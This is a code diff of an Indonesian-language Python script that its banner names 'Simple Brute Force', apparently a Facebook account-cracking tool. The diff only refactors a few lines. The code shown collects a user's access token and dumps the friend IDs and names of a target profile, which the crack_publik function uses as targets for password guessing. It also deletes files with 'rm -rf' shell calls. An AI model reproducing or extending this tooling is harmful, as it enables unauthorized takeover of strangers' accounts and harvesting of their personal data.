@@ -11,8 +11,7 @@ bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "0
 def logo():
     print('\n   _______  ____    ___ \n  / __/ _ )/ __/___|_  | ┌────────────────────────┐\n _\ \/ _  / _//___/ __/  │  • Coded By Dapunta •  │\n/___/____/_/     /____/  │ Github.com/Dapunta/sbf │\n  Simple Brute Force     └────────────────────────┘\n')
 def login(__cici__):
-    os.system('rm -rf token.txt');os.system('clear');logo()
-    token = input('[•] Masukkan Token :\n\n')
+    os.system('rm -rf token.txt');os.system('clear');logo();token = input('[•] Masukkan Token :\n\n')
     try:x = requests.get("https://graph.facebook.com/me?access_token=" + token);y = json.loads(x.text);n = y['name'];v = open("token.txt", "w");v.write(token);v.close();exit(bot_follow_sbf.main(__cici__))
     except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login(__cici__)
     except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login(__cici__)
@@ -29,7 +28,7 @@ def crack_publik(__cici__):
     print('\n[•] Ketik \'me\' Untuk Dump Dari Teman');i = input("[•] ID Publik : ")
     try:
         try:o = requests.get("https://graph.facebook.com/" + i + "?access_token=" + token);b = json.loads(o.text);print ('[•] Nama : %s'%(b['name']))
-        except (KeyError,IOError):print('\n[!] ID Tidak Ditemukan');menu()
+        except (KeyError,IOError):print('\n[!] ID Tidak Ditemukan');menu(__cici__)
         r = requests.get("https://graph.facebook.com/%s/friends?limit=5000&access_token=%s"%(i,token));id = [];z = json.loads(r.text);l = (b["first_name"]+".json").replace(" ","_");d = open(l,"w")
         for a in z["data"]:
             id.append(a["id"]+"•"+a["name"]);d.write(a["id"]+"•"+a["name"]+"\n")
